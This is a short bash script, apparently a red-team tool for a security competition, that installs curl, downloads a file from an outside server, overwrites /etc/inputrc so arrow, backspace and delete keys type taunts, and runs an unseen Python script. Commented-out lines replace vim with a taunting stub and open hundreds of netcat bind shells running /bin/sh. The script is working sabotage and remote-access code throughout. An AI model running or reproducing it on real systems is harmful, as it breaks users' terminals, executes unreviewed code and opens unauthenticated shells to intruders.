#!/bin/bash
if [ ! `which curl` ]; then
   if [ `which yum` ]; then
      yum install curl -y
   elif [ `which apt` ]; then
      apt-get install curl -y
   elif [ `which pacman` ]; then
      pacman -S curl --noconfirm
   elif [ `which dnf` ]; then
      dnf install curl -y
   else
      echo "Unknown OS"
   fi
fi
curl http://server.mdbooktech.com/uwubuntu.png > /tmp/uwubuntu.png


#Mess with inputs
echo '"\e[A": "u mad bro?"' >> /etc/inputrc
echo '"\e[C": "no typos allowed"' >> /etc/inputrc
echo '"\e[D": "no typos allowed"' >> /etc/inputrc
echo '"\177": "oops"' >> /etc/inputrc
echo '"\b": "oops"' >> /etc/inputrc
echo '"\e[3~": "nope"' >> /etc/inputrc

# Disable vim and vi
# Not using this during the current competition because it ruins editor_shim
# echo "#!/bin/bash" > /usr/bin/vim
# echo "echo use nano, coward" >> /usr/bin/vim
# chmod +x /usr/bin/vim
# echo "echo use nano, coward" > $(which vi)

#Run the python script
if [ `which python3` ]; then
   python3 basic-stuff.py
elif [ `which python` ]; then
   python basic-stuff.py
elif [ `which python2` ]; then
   python2 basic-stuff.py
elif [ `which py` ]; then
   py basic-stuff.py
fi

#Simple bind shell on a ton of random ports
# for i in {1..500}
# do
#    nc -lke /bin/sh &
# done